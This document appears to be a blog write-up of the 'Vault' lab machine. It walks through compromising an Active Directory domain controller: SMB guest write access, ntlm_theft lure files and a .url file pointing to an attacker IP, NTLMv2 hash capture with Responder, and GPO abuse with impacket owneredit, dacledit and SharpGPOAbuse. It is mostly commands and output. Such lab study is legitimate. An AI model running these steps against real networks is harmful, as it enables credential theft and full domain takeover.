+++
date = '2026-02-26T18:26:56+09:00'
draft = false
title = 'Valut'
tags = ["responder", "DACL", "bloodhound", "ntlm_theft", "SharpGPOAbuse", "impacket-owneredit", "impacket-dacledit"]
description = 'Learn how to escalate privileges in an Active Directory environment by exploiting SMB guest write access and GPO abuse. This walkthrough covers NTLM hash capturing with Responder, ntlm-theft, and leveraging SharpGPOAbuse to gain local admin rights on a Windows Domain Controller.'
+++

# initial foothold

## nmap
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-24 09:18:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-02-23T09:16:03
|_Not valid after:  2026-08-25T09:16:03
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-24T09:19:19+00:00
|_ssl-date: 2026-02-24T09:20:33+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  unknown
49679/tcp open  unknown
49703/tcp open  unknown
```

I started by checking for guest access on the target machine.

# enumeration

## SMB

I checked that I have a guest access.

```bash
crackmapexec smb 192.168.115.172 -u 'guest' -p '' --shares

SMB         192.168.115.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.115.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.115.172 445    DC               [+] Enumerated shares
SMB         192.168.115.172 445    DC               Share           Permissions     Remark
SMB         192.168.115.172 445    DC               -----           -----------     ------
SMB         192.168.115.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.115.172 445    DC               C$                              Default share
SMB         192.168.115.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.115.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.115.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.115.172 445    DC               SYSVOL                          Logon server share 
```

The output confirmed that I have READ/WRITE permissions on the DocumentsShare.

Since I have write access, I can attempt to capture an NTLM hash by forcing a user to authenticate to my machine.

I used [ntlm-theft](https://github.com/Greenwolf/ntlm_theft) to generate a set of malicious files. If a user interacts with any of these files, **Responder** will capture their hash.


# exploitation

1. Craft the payload.

```bash
python3 ntlm_theft.py -g all -s 192.168.45.247 -f lure
```

2. Start Responder

```bash
sudo responder -I tun0 -v
```

3. Upload the files.

```bash
prompt off
mput *
```

Shortly after, a connection was triggered, and I captured the NTLMv2 hash for the user anirudh

```bash
[SMB] NTLMv2-SSP Client   : 192.168.115.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:40babecc932bb0e4:02EAF46724C05C5D92F5FA10E91CCC7D:010100000000000000715745BEA5DC0193C7B6FF64C22AFD00000000020008004C0039004100450001001E00570049004E002D004700310042003500520051003700440031003200380004003400570049004E002D00470031004200350052005100370044003100320038002E004C003900410045002E004C004F00430041004C00030014004C003900410045002E004C004F00430041004C00050014004C003900410045002E004C004F00430041004C000700080000715745BEA5DC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340037000000000000000000
```

I cracked the captured hash and retrieved the password: SecureHM

With these credentials, I gained initial access via evil-winrm:

```bash
evil-winrm -i 192.168.115.172 -u 'anirudh' -p 'SecureHM'
```

> [!note] Manual methods.
> You can also do this manually by creating a .url file that points to your attacker IP.

```bash
cat @hax.url 
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\attacker_ip\%USERNAME%.icon
IconIndex=1
```

# privilege escalation

Running `whoami /priv` showed that the user has **SeBackupPrivilege**. However, after some investigation, this turned out to be a rabbit hole.

I spent some time on it. 

## GPO Abuse via BloodHound

![bloodhound](/images/vault/vault-bloodhound.png)

Using BloodHound, I discovered that the user anirudh has write permissions over the Default Domain Policy.

To escalate privileges, I took ownership of the GPO and modified the DACL using Impacket's owneredit and dacledit. Then, I used **SharpGPOAbuse.exe** to add anirudh to the local Administrators group.

```bash
impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM'

[*] Current owner information below
[*] - SID: S-1-5-21-537427935-490066102-1511301751-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=vault,DC=offsec
[*] OwnerSid modified successfully!
```

And give all privileges to the user.

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260225-104610.bak
[*] DACL modified successfully!
```

![GPO](/images/vault/valut-GPO.png)

The user anirudh is owner of default domain policy.

With Powerview, we can confirm the user has permissions on it.

```hash
*Evil-WinRM* PS C:\Users\anirudh> Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh


Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```

Now, let's modify the policy using **SharpGPOAbuse.exe**!

```bash
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

Now anirudh became administrator!

After successfully modifying the GPO, I forced a policy update.

`gpupdate /force`

![whoami](/images/vault/vault-admin.png)

With the policy applied, anirudh was added to the local Administrators group. I logged back in, verified my identity with whoami /groups, and successfully retrieved the root flag from the Administrator's desktop.
